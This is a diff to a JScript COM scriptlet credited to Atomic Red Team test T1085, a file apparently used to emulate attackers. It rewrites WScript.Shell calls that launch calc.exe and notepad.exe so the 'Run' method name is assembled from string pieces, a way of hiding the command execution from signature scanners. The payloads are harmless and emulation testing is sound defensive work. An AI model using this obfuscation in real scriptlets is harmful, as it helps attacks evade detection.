@@ -20,9 +20,10 @@
         <!-- @RedCanary - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct -->
 	<script language="JScript">
 		<![CDATA[
-
-			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
-
+            var _shell = new ActiveXObject("WScript.Shell");
+            var _run = "Ru" + "n";
+            var _calc = "calc.exe";
+            var _cmd = _shell[_run](_calc);
 		]]>
 	</script>
 </registration>
@@ -32,12 +33,13 @@
 </public>
 <script language="JScript">
 <![CDATA[
-
-	function Exec()
-	{
-		var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");
-	}
-
+    function _exec()
+    {
+        var _shell = new ActiveXObject("WScript.Shell");
+        var _run = "Ru" + "n";
+        var _notepad = "notepad.exe";
+        var _cmd = _shell[_run](_notepad);
+    }
 ]]>
 </script>
 
